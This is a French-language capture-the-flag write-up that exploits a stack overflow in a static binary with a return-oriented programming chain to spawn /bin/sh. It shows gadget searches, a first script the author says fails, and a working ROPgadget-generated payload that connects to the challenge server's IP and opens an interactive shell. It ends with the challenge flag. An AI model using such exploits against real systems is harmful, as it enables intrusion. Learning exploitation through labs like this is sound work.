# Bof_1 Get Shell

## Analyse

Toujours sur le même binaire que le `Bof_1` seulement cette fois ci, il faut obtenir un shell sur la machine.

## Exploitation

Dans l'optique d'apprendre quelque chose et de manière générale il est toujours mieux de faire sois-même ses shellcodes.

Pour celui de ce challenge, le but aurait été de `pop` les 4 registres permettant ensuite de faire un `syscall` à `execve`.

Pour cela, il faut 4 gadget `pop rax; ret` qui va contenir `0x3b` qui est le syscall pour `execve`.
`pop rdi; ret` qui va contenir un pointer sur `/bin/sh`.
`pop rsi; ret` qui va contenir NULL tout comme `pop rdx; ret`.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ ropper --file ./service --search "pop rax"
[snip]
0x000000000040302c: pop rax; ret;

aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ ropper --file ./service --search "pop rdi"
[snip]
0x0000000000401ece: pop rdi; ret;

aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ ropper --file ./service --search "pop rsi"
[snip]
0x000000000040880e: pop rsi; ret;

aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ ropper --file ./service --search "pop rdx"
[snip]
0x000000000048ef5b: pop rdx; pop rbx; ret; 
[snip]
```

Il faut aussi un gadget `push rsp` pour permettre à `pop rdi` de récupérer un pointer sur `/bin/sh`.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ ropper --file ./service --search "push rsp"
[snip]
0x0000000000423354: push rsp; ret;
```

Enfin, il faut aussi un gadget avec `syscall`.

```js
aether@ysera:~/Documents/ctf/cyberthreatforce/pwn/Bof_1 $ ropper --file ./service --search "syscall" 
[snip]
0x000000000041ca64: syscall; ret;
```

Une fois tous ces gadgets, il ne manque plus qu'un script python pour envoyer la ropchain.

```python
#!/usr/bin/env python3

from pwn import *

import struct

def p64(addr):
    return struct.pack("<Q", addr)

# ROPgadget
POP_RAX = p64(0x000000000040302c)
POP_RDI = p64(0x0000000000401ece)
POP_RSI = p64(0x000000000040880e)
POP_RDX_RBX = p64(0x000000000048ef5b)
PUSH_RSP = p64(0x0000000000423354)
SYSCALL = p64(0x000000000041ca64)

# ROPChain
payload = b"".join([
    b"A" * 0x38,# Overflow
    PUSH_RSP, p64(0x68732f6e69622f2f),# Pointer //bin/sh
    PUSH_RDI,# //bin/sh
    POP_RAX, p64(0x3b),# execve syscall
    POP_RSI, p64(0x0),# NULL
    POP_RDX_RBX, p64(0x0), p64(0x0),# NULL
    SYSCALL# Syscall
    ])

print(payload)
```

Malheureusement, ce shellcode ne fonctionne pas. Le problème vient du `push rsp` et de la manière dont je récupère `//bin/sh`.
Après de longues recherches, je n'ai pas trouvé le moyen d'arriver à fin mes fins, je me suis donc rappelé de l'option `--ropchain` de `ROPgadget` qui permet de faire le travail tout seul.

## Exploitation Le Retour

Etant donné que le binaire est compilé en statique beaucoup plus d'instruction son disponible.

Technique de chien mais technique efficace, un petit `ROPgadget --binary ./service --ropchain` nous donne directement une ropchain fonctionnel.
J'ai été contraint de faire cela car je n'ai pas réussi à faire une ropchain fonctionnel. Nottament pour récupérer une adresse pour `/bin/sh`.

```python
#!/usr/bin/env python2

from struct import pack
import socket

HOST = "144.217.73.235"
PORT = 21222

# Padding goes here
p = b'A' * 0x38

p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
p += pack('<Q', 0x00000000004cc0e0) # @ .data
p += pack('<Q', 0x000000000040302c) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
p += pack('<Q', 0x00000000004439c9) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004502f5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401ece) # pop rdi ; ret
p += pack('<Q', 0x00000000004cc0e0) # @ .data
p += pack('<Q', 0x000000000040880e) # pop rsi ; ret
p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
p += pack('<Q', 0x000000000048ef5b) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004cc0e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004439c9) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000483e30) # add rax, 1 ; ret
[snip]
p += pack('<Q', 0x000000000040120e) # syscall

print(p)

tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp.connect((HOST, PORT))
tcp.settimeout(1)

tcp.recv(1024)

tcp.send(p + b"\n")

tcp.recv(1024)
tcp.recv(1024)

print("[+] Payload sent !")

while True:
    try:
        tcp.send(input(">>> ").encode() + b"\n")
        print(tcp.recv(1024).decode().strip())
    except socket.timeout:
        continue
    except KeyboardInterrupt:
        exit(0)
```

Le flag est ensuite disponible sous `/home/ctf/flag.txt`.

flag: `CYBERTF{B@sic_R0PChain}`
